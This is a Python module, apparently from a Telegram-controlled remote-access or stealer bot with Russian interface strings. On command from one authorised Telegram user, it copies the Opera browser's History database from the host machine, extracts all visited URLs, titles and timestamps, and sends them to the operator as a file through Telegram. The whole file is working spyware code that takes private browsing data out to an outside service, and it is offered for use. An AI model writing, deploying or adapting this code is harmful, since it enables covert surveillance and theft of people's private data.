##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


from aiogram import types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile

import datetime
import os
import shutil
import sqlite3

from config import ALLOWED_USER_ID, directory 

def register_opera_history_handlers(dp):        
    @dp.message(F.text.lower() == "история оперы")
    @dp.message(Command("opera_history"))
    async def cmd_start(message: types.Message):
        if message.from_user.id == ALLOWED_USER_ID:
            def get_opera_history():
                history_path = os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable\History')

                if not os.path.exists(history_path):
                    return False, "Файл истории Opera не найден. Возможно, браузер Opera не установлен."

                temp_history_path = 'temp_opera_history'
                shutil.copy2(history_path, temp_history_path)

                conn = sqlite3.connect(temp_history_path)
                cursor = conn.cursor()

                query = """
                SELECT urls.url, urls.title, urls.last_visit_time
                FROM urls
                ORDER BY last_visit_time DESC
                """
                cursor.execute(query)

                rows = cursor.fetchall()
                text_to_save = ""

                for row in rows:
                    url = row[0]
                    title = row[1]
                    last_visit_time = row[2]


                    try:
                        if last_visit_time > 0:
                            last_visit_time = last_visit_time / 1000000 - 11644473600
                            last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
                        else:
                            last_visit_time = 'Invalid time'
                    except (OSError, ValueError) as e:
                        last_visit_time = f'Error: {str(e)}'

                    text_to_save += f"URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n"

                file_path = os.path.join(directory, 'История_Оперы.txt')

                with open(file_path, 'w', encoding='utf-8') as file:
                    file.write(text_to_save)

                conn.close()
                os.remove(temp_history_path)

                return True, file_path

            await message.answer("Получение истории Opera. Пожалуйста, подождите...")
            success, result = get_opera_history()

            if not success:
                await message.answer(result)
                return

            file_path = result
            try:
                file_to_send = FSInputFile(file_path)
                await message.answer_document(document=file_to_send, caption="Вот ваш файл!")

            except Exception as e:
                await message.answer(f"Ошибка при отправке файла: {e}")
            os.remove(file_path)
        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")